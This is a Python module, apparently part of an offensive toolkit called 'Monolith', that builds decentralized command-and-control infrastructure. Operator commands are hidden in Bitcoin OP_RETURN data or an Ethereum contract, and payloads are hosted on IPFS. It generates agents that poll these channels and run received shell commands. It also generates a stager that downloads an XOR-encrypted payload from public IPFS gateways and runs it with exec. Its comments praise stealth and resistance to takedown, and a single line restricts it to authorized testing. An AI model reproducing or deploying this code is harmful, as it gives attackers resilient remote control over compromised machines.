#!/usr/bin/env python3
"""
Blockchain & Decentralized C2 Module
Kapatılamayan sunucular - Devletler Bitcoin'i kapatamaz!

Features:
1. Bitcoin/Dogecoin OP_RETURN C2 - Blockchain'e komut gömme
2. IPFS Payload Hosting - Dağıtık dosya barındırma
3. Ethereum Smart Contract C2 - Akıllı kontrat tabanlı C2
4. Tor Hidden Service Integration

WARNING: Bu modül yalnızca yetkili penetrasyon testleri içindir!
"""

import hashlib
import base64
import json
import time
import struct
import binascii
import secrets
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Dict, Optional, Any, Tuple
from datetime import datetime
import urllib.request
import urllib.parse


class BlockchainNetwork(Enum):
    """Desteklenen blockchain ağları"""
    BITCOIN_MAINNET = "btc_main"
    BITCOIN_TESTNET = "btc_test"
    DOGECOIN = "doge"
    LITECOIN = "ltc"
    ETHEREUM = "eth"
    ETHEREUM_TESTNET = "eth_test"


class IPFSGateway(Enum):
    """IPFS Gateway'leri"""
    IPFS_IO = "https://ipfs.io/ipfs/"
    CLOUDFLARE = "https://cloudflare-ipfs.com/ipfs/"
    PINATA = "https://gateway.pinata.cloud/ipfs/"
    INFURA = "https://infura-ipfs.io/ipfs/"
    DWEB = "https://dweb.link/ipfs/"
    W3S = "https://w3s.link/ipfs/"


class CommandType(Enum):
    """C2 Komut Tipleri"""
    SHELL = "SHL"
    DOWNLOAD = "DWN"
    UPLOAD = "UPL"
    SLEEP = "SLP"
    EXFIL = "EXF"
    KILL = "KIL"
    UPDATE = "UPD"
    IPFS_FETCH = "IFS"


@dataclass
class BlockchainCommand:
    """Blockchain C2 komutu"""
    command_id: str
    command_type: CommandType
    payload: str
    timestamp: datetime
    tx_hash: Optional[str] = None
    block_height: Optional[int] = None
    encrypted: bool = True
    
    
@dataclass
class IPFSFile:
    """IPFS dosyası"""
    cid: str  # Content ID (hash)
    filename: str
    size: int
    mime_type: str
    upload_time: datetime
    pinned: bool = False
    gateways: List[str] = field(default_factory=list)


@dataclass
class WalletConfig:
    """Cüzdan yapılandırması"""
    network: BlockchainNetwork
    address: str
    wif_key: Optional[str] = None  # Private key (WIF format)
    watch_only: bool = True


class BitcoinC2:
    """
    Bitcoin OP_RETURN C2 Sistemi
    
    Komutlar blockchain'e yazılır, ajanlar blockchain'i okur.
    Merkezi sunucu yok = Kapatılamaz!
    """
    
    # OP_RETURN limiti: 80 byte
    OP_RETURN_LIMIT = 80
    
    # Magic bytes for command identification
    MAGIC_PREFIX = b"MNL"  # Monolith
    
    # Blockchain API endpoints
    BLOCKCHAIN_APIS = {
        BlockchainNetwork.BITCOIN_MAINNET: {
            'tx_info': 'https://blockchain.info/rawtx/',
            'address_txs': 'https://blockchain.info/rawaddr/',
            'broadcast': 'https://blockchain.info/pushtx',
            'utxo': 'https://blockchain.info/unspent?active='
        },
        BlockchainNetwork.BITCOIN_TESTNET: {
            'tx_info': 'https://blockstream.info/testnet/api/tx/',
            'address_txs': 'https://blockstream.info/testnet/api/address/',
            'broadcast': 'https://blockstream.info/testnet/api/tx',
            'utxo': 'https://blockstream.info/testnet/api/address/'
        },
        BlockchainNetwork.DOGECOIN: {
            'tx_info': 'https://dogechain.info/api/v1/transaction/',
            'address_txs': 'https://dogechain.info/api/v1/address/transactions/',
            'broadcast': 'https://dogechain.info/api/v1/pushtx',
            'utxo': 'https://dogechain.info/api/v1/unspent/'
        }
    }
    
    def __init__(self, network: BlockchainNetwork = BlockchainNetwork.BITCOIN_TESTNET):
        self.network = network
        self.encryption_key = secrets.token_bytes(32)
        self.commands_sent: List[BlockchainCommand] = []
        
    def _xor_encrypt(self, data: bytes, key: bytes) -> bytes:
        """Basit XOR şifreleme"""
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    
    def _encode_command(self, cmd_type: CommandType, payload: str, encrypt: bool = True) -> bytes:
        """Komutu OP_RETURN formatına encode et"""
        # Format: MAGIC(3) + TYPE(3) + LEN(2) + PAYLOAD(n) + CHECKSUM(4)
        cmd_bytes = cmd_type.value.encode('ascii')
        payload_bytes = payload.encode('utf-8')
        
        if encrypt:
            payload_bytes = self._xor_encrypt(payload_bytes, self.encryption_key)
        
        # Length check
        total_len = 3 + 3 + 2 + len(payload_bytes) + 4
        if total_len > self.OP_RETURN_LIMIT:
            # Truncate or compress
            max_payload = self.OP_RETURN_LIMIT - 12
            payload_bytes = payload_bytes[:max_payload]
        
        length = struct.pack('>H', len(payload_bytes))
        data = self.MAGIC_PREFIX + cmd_bytes + length + payload_bytes
        checksum = hashlib.sha256(data).digest()[:4]
        
        return data + checksum
    
    def _decode_command(self, op_return_data: bytes, decrypt: bool = True) -> Optional[BlockchainCommand]:
        """OP_RETURN verisinden komutu decode et"""
        try:
            if not op_return_data.startswith(self.MAGIC_PREFIX):
                return None
            
            cmd_type = op_return_data[3:6].decode('ascii')
            length = struct.unpack('>H', op_return_data[6:8])[0]
            payload_bytes = op_return_data[8:8+length]
            checksum = op_return_data[8+length:8+length+4]
            
            # Verify checksum
            data = op_return_data[:8+length]
            if hashlib.sha256(data).digest()[:4] != checksum:
                return None
            
            if decrypt:
                payload_bytes = self._xor_encrypt(payload_bytes, self.encryption_key)
            
            payload = payload_bytes.decode('utf-8')
            
            return BlockchainCommand(
                command_id=hashlib.md5(op_return_data).hexdigest()[:8],
                command_type=CommandType(cmd_type),
                payload=payload,
                timestamp=datetime.now(),
                encrypted=decrypt
            )
        except Exception as e:
            return None
    
    def create_command_tx(self, cmd_type: CommandType, payload: str, 
                          encrypt: bool = True) -> Dict[str, Any]:
        """Komut içeren transaction oluştur"""
        op_return_data = self._encode_command(cmd_type, payload, encrypt)
        
        # Create unsigned transaction template
        tx_template = {
            'version': 1,
            'inputs': [],  # Will be filled with UTXOs
            'outputs': [
                {
                    'value': 0,  # OP_RETURN has 0 value
                    'script': '6a' + format(len(op_return_data), '02x') + op_return_data.hex()
                }
            ],
            'locktime': 0
        }
        
        command = BlockchainCommand(
            command_id=secrets.token_hex(4),
            command_type=cmd_type,
            payload=payload,
            timestamp=datetime.now(),
            encrypted=encrypt
        )
        self.commands_sent.append(command)
        
        return {
            'command': command,
            'tx_template': tx_template,
            'op_return_hex': op_return_data.hex(),
            'op_return_base64': base64.b64encode(op_return_data).decode(),
            'size': len(op_return_data),
            'network': self.network.value
        }
    
    def generate_agent_code(self, watch_address: str) -> str:
        """Blockchain izleyen ajan kodu üret"""
        return f'''#!/usr/bin/env python3
"""
Blockchain C2 Agent
Watches: {watch_address}
Network: {self.network.value}
"""

import urllib.request
import json
import base64
import hashlib
import struct
import time
import subprocess
import os

WATCH_ADDRESS = "{watch_address}"
MAGIC_PREFIX = b"MNL"
ENCRYPTION_KEY = {list(self.encryption_key)}
CHECK_INTERVAL = 60  # seconds

def xor_decrypt(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def fetch_transactions():
    """Fetch recent transactions for watched address"""
    try:
        url = f"https://blockchain.info/rawaddr/{{WATCH_ADDRESS}}?limit=10"
        with urllib.request.urlopen(url, timeout=30) as response:
            return json.loads(response.read())
    except Exception as e:
        return None

def parse_op_return(tx):
    """Extract OP_RETURN data from transaction"""
    for output in tx.get('out', []):
        script = output.get('script', '')
        if script.startswith('6a'):  # OP_RETURN
            hex_data = script[4:]  # Skip 6a + length byte
            return bytes.fromhex(hex_data)
    return None

def decode_command(op_return_data):
    """Decode command from OP_RETURN"""
    if not op_return_data or not op_return_data.startswith(MAGIC_PREFIX):
        return None
    
    try:
        cmd_type = op_return_data[3:6].decode('ascii')
        length = struct.unpack('>H', op_return_data[6:8])[0]
        payload = op_return_data[8:8+length]
        
        # Decrypt
        payload = xor_decrypt(payload, bytes(ENCRYPTION_KEY))
        
        return {{
            'type': cmd_type,
            'payload': payload.decode('utf-8')
        }}
    except:
        return None

def execute_command(cmd):
    """Execute received command"""
    cmd_type = cmd['type']
    payload = cmd['payload']
    
    if cmd_type == 'SHL':  # Shell command
        result = subprocess.run(payload, shell=True, capture_output=True)
        return result.stdout.decode()
    elif cmd_type == 'SLP':  # Sleep
        time.sleep(int(payload))
        return "OK"
    elif cmd_type == 'KIL':  # Kill
        os._exit(0)
    elif cmd_type == 'IFS':  # IPFS fetch
        # Fetch from IPFS and execute
        pass
    
    return None

def main():
    seen_txs = set()
    
    while True:
        data = fetch_transactions()
        if data:
            for tx in data.get('txs', []):
                tx_hash = tx['hash']
                if tx_hash in seen_txs:
                    continue
                seen_txs.add(tx_hash)
                
                op_data = parse_op_return(tx)
                if op_data:
                    cmd = decode_command(op_data)
                    if cmd:
                        print(f"[+] Command received: {{cmd['type']}}")
                        result = execute_command(cmd)
                        print(f"[+] Result: {{result}}")
        
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
'''

    def scan_address_for_commands(self, address: str) -> List[BlockchainCommand]:
        """Adresteki komutları tara"""
        commands = []
        # In real implementation, would fetch from blockchain API
        # For demo, return empty list
        return commands


class IPFSC2:
    """
    IPFS (InterPlanetary File System) C2
    
    Dağıtık dosya sistemi - Engellenemez payload hosting!
    """
    
    DEFAULT_GATEWAYS = [
        "https://ipfs.io/ipfs/",
        "https://cloudflare-ipfs.com/ipfs/",
        "https://gateway.pinata.cloud/ipfs/",
        "https://dweb.link/ipfs/",
        "https://w3s.link/ipfs/",
        "https://4everland.io/ipfs/",
    ]
    
    def __init__(self, api_url: str = "http://127.0.0.1:5001"):
        self.api_url = api_url
        self.uploaded_files: Dict[str, IPFSFile] = {}
        self.gateways = self.DEFAULT_GATEWAYS.copy()
        
    def _calculate_cid(self, content: bytes) -> str:
        """CID hesapla (simulated)"""
        # Real CID uses multihash, this is simplified
        hash_bytes = hashlib.sha256(content).digest()
        # Simulate CIDv1 format
        return "Qm" + base64.b32encode(hash_bytes).decode()[:44]
    
    def upload_payload(self, content: bytes, filename: str = "payload.bin",
                       encrypt: bool = True, key: bytes = None) -> IPFSFile:
        """Payload'ı IPFS'e yükle"""
        if encrypt:
            if key is None:
                key = secrets.token_bytes(32)
            content = bytes([content[i] ^ key[i % len(key)] for i in range(len(content))])
        
        cid = self._calculate_cid(content)
        
        ipfs_file = IPFSFile(
            cid=cid,
            filename=filename,
            size=len(content),
            mime_type="application/octet-stream",
            upload_time=datetime.now(),
            pinned=False,
            gateways=[g + cid for g in self.gateways]
        )
        
        self.uploaded_files[cid] = ipfs_file
        
        return ipfs_file
    
    def generate_download_urls(self, cid: str) -> List[str]:
        """CID için indirme URL'leri üret"""
        return [g + cid for g in self.gateways]
    
    def create_stager(self, cid: str, encryption_key: bytes = None) -> str:
        """IPFS'ten payload indiren stager kodu"""
        urls = self.generate_download_urls(cid)
        
        return f'''#!/usr/bin/env python3
"""IPFS Payload Stager - CID: {cid}"""

import urllib.request
import random

GATEWAYS = {json.dumps(urls)}
KEY = {list(encryption_key) if encryption_key else "None"}

def fetch_payload():
    random.shuffle(GATEWAYS)
    for url in GATEWAYS:
        try:
            with urllib.request.urlopen(url, timeout=30) as r:
                data = r.read()
                if KEY:
                    data = bytes([data[i] ^ KEY[i % len(KEY)] for i in range(len(data))])
                return data
        except:
            continue
    return None

def main():
    payload = fetch_payload()
    if payload:
        exec(compile(payload, '<ipfs>', 'exec'))

if __name__ == "__main__":
    main()
'''

    def pin_file(self, cid: str) -> bool:
        """Dosyayı IPFS'te kalıcı yap (pin)"""
        # In real implementation, would call IPFS API
        if cid in self.uploaded_files:
            self.uploaded_files[cid].pinned = True
            return True
        return False
    
    def create_ipns_name(self, cid: str) -> str:
        """IPNS ismi oluştur (değiştirilebilir pointer)"""
        # IPNS allows mutable pointers to IPFS content
        return f"k51qzi5uqu5d{secrets.token_hex(20)}"


class EthereumC2:
    """
    Ethereum Smart Contract C2
    
    Akıllı kontrat üzerinden komut ve kontrol.
    """
    
    # Simple C2 contract ABI
    CONTRACT_ABI = '''
    [
        {
            "inputs": [{"name": "cmd", "type": "string"}],
            "name": "postCommand",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "getLatestCommand",
            "outputs": [{"name": "", "type": "string"}],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [{"name": "result", "type": "string"}],
            "name": "postResult",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ]
    '''
    
    SAMPLE_CONTRACT = '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MonolithC2 {
    address public operator;
    string private latestCommand;
    string private latestResult;
    mapping(address => bool) public authorizedAgents;
    
    event CommandPosted(string cmd, uint256 timestamp);
    event ResultPosted(address agent, string result);
    
    modifier onlyOperator() {
        require(msg.sender == operator, "Not authorized");
        _;
    }
    
    modifier onlyAgent() {
        require(authorizedAgents[msg.sender], "Not an agent");
        _;
    }
    
    constructor() {
        operator = msg.sender;
    }
    
    function postCommand(string memory cmd) public onlyOperator {
        latestCommand = cmd;
        emit CommandPosted(cmd, block.timestamp);
    }
    
    function getLatestCommand() public view onlyAgent returns (string memory) {
        return latestCommand;
    }
    
    function postResult(string memory result) public onlyAgent {
        latestResult = result;
        emit ResultPosted(msg.sender, result);
    }
    
    function authorizeAgent(address agent) public onlyOperator {
        authorizedAgents[agent] = true;
    }
    
    function revokeAgent(address agent) public onlyOperator {
        authorizedAgents[agent] = false;
    }
}
'''
    
    def __init__(self, network: str = "sepolia"):
        self.network = network
        self.contract_address = None
        
    def generate_contract(self) -> str:
        """C2 smart contract kodunu döndür"""
        return self.SAMPLE_CONTRACT
    
    def generate_agent_code(self, contract_address: str, rpc_url: str) -> str:
        """Ethereum C2 agent kodu"""
        return f'''#!/usr/bin/env python3
"""
Ethereum Smart Contract C2 Agent
Contract: {contract_address}
Network: {self.network}
"""

from web3 import Web3
import time
import subprocess

CONTRACT_ADDRESS = "{contract_address}"
RPC_URL = "{rpc_url}"
CHECK_INTERVAL = 30

ABI = {self.CONTRACT_ABI}

def main():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)
    
    last_cmd = ""
    
    while True:
        try:
            cmd = contract.functions.getLatestCommand().call()
            if cmd and cmd != last_cmd:
                last_cmd = cmd
                print(f"[+] New command: {{cmd}}")
                
                # Execute
                result = subprocess.run(cmd, shell=True, capture_output=True)
                output = result.stdout.decode()
                
                # Post result (requires gas/ETH)
                # contract.functions.postResult(output).transact()
                
        except Exception as e:
            pass
        
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
'''


class DecentralizedC2:
    """
    Decentralized C2 Ana Sınıfı
    
    Tüm blockchain ve dağıtık sistemleri birleştirir.
    """
    
    C2_METHODS = {
        'bitcoin': {
            'name': 'Bitcoin OP_RETURN C2',
            'description': 'Bitcoin işlemlerinin OP_RETURN alanına komut gömme',
            'icon': '₿',
            'cost': '~0.0001 BTC/komut',
            'latency': '~10 dakika',
            'stealth': 'Çok Yüksek'
        },
        'dogecoin': {
            'name': 'Dogecoin C2',
            'description': 'Dogecoin ile ucuz ve hızlı komut aktarımı',
            'icon': '🐕',
            'cost': '~1 DOGE/komut',
            'latency': '~1 dakika',
            'stealth': 'Yüksek'
        },
        'ethereum': {
            'name': 'Ethereum Smart Contract',
            'description': 'Akıllı kontrat üzerinden C2 operasyonları',
            'icon': 'Ξ',
            'cost': 'Gas fee (~$1-10)',
            'latency': '~15 saniye',
            'stealth': 'Orta'
        },
        'ipfs': {
            'name': 'IPFS Payload Hosting',
            'description': 'Dağıtık dosya sistemi ile payload barındırma',
            'icon': '🌐',
            'cost': 'Ücretsiz',
            'latency': 'Anında',
            'stealth': 'Yüksek'
        },
        'ipns': {
            'name': 'IPNS Dynamic Content',
            'description': 'Değiştirilebilir IPFS pointer ile dinamik içerik',
            'icon': '🔗',
            'cost': 'Ücretsiz',
            'latency': '~1 dakika',
            'stealth': 'Yüksek'
        }
    }
    
    def __init__(self):
        self.bitcoin_c2 = BitcoinC2()
        self.ipfs_c2 = IPFSC2()
        self.ethereum_c2 = EthereumC2()
        
    def get_methods(self) -> Dict[str, Any]:
        """Mevcut C2 methodlarını döndür"""
        return self.C2_METHODS
    
    def create_bitcoin_command(self, cmd_type: str, payload: str) -> Dict[str, Any]:
        """Bitcoin C2 komutu oluştur"""
        command_type = CommandType(cmd_type)
        return self.bitcoin_c2.create_command_tx(command_type, payload)
    
    def create_ipfs_payload(self, content: str, filename: str = "payload.py",
                            encrypt: bool = True) -> Dict[str, Any]:
        """IPFS payload oluştur"""
        content_bytes = content.encode('utf-8')
        key = secrets.token_bytes(32) if encrypt else None
        
        ipfs_file = self.ipfs_c2.upload_payload(content_bytes, filename, encrypt, key)
        stager = self.ipfs_c2.create_stager(ipfs_file.cid, key)
        
        return {
            'cid': ipfs_file.cid,
            'filename': filename,
            'size': ipfs_file.size,
            'gateways': ipfs_file.gateways,
            'stager_code': stager,
            'encryption_key': list(key) if key else None,
            'upload_time': ipfs_file.upload_time.isoformat()
        }
    
    def generate_full_agent(self, methods: List[str] = None) -> str:
        """Çoklu C2 destekli ajan kodu"""
        if methods is None:
            methods = ['bitcoin', 'ipfs']
        
        agent_code = '''#!/usr/bin/env python3
"""
Monolith Decentralized C2 Agent
Multi-channel resilient command & control
"""

import urllib.request
import json
import hashlib
import struct
import time
import subprocess
import os
import random
import threading

# Configuration
BITCOIN_WATCH_ADDRESS = "1MonolithC2WatchAddressXXXXXXXX"
IPFS_GATEWAYS = [
    "https://ipfs.io/ipfs/",
    "https://cloudflare-ipfs.com/ipfs/",
    "https://dweb.link/ipfs/",
]
CHECK_INTERVAL = 60
MAGIC_PREFIX = b"MNL"

class BlockchainChannel:
    """Bitcoin/Crypto C2 channel"""
    
    def check_commands(self):
        """Check blockchain for new commands"""
        try:
            url = f"https://blockchain.info/rawaddr/{BITCOIN_WATCH_ADDRESS}?limit=5"
            with urllib.request.urlopen(url, timeout=30) as r:
                data = json.loads(r.read())
                for tx in data.get('txs', []):
                    # Parse OP_RETURN
                    for out in tx.get('out', []):
                        script = out.get('script', '')
                        if script.startswith('6a'):
                            return self.decode_command(bytes.fromhex(script[4:]))
        except:
            pass
        return None
    
    def decode_command(self, data):
        if not data.startswith(MAGIC_PREFIX):
            return None
        # Decode logic here
        return None

class IPFSChannel:
    """IPFS C2 channel"""
    
    def fetch_payload(self, cid):
        """Fetch payload from IPFS"""
        for gateway in IPFS_GATEWAYS:
            try:
                url = gateway + cid
                with urllib.request.urlopen(url, timeout=30) as r:
                    return r.read()
            except:
                continue
        return None

class Agent:
    """Main agent class"""
    
    def __init__(self):
        self.blockchain = BlockchainChannel()
        self.ipfs = IPFSChannel()
        self.running = True
    
    def execute(self, cmd):
        """Execute command"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
            return result.stdout.decode()
        except:
            return "Error"
    
    def run(self):
        """Main loop"""
        while self.running:
            # Check blockchain channel
            cmd = self.blockchain.check_commands()
            if cmd:
                print(f"[BTC] Command: {cmd}")
                self.execute(cmd)
            
            time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    agent = Agent()
    agent.run()
'''
        return agent_code


# Test
if __name__ == "__main__":
    dc2 = DecentralizedC2()
    
    # Test Bitcoin C2
    result = dc2.create_bitcoin_command("SHL", "whoami")
    print(f"Bitcoin command: {result['op_return_hex']}")
    
    # Test IPFS
    result = dc2.create_ipfs_payload("print('Hello from IPFS!')")
    print(f"IPFS CID: {result['cid']}")
    print(f"Gateways: {result['gateways'][:2]}")
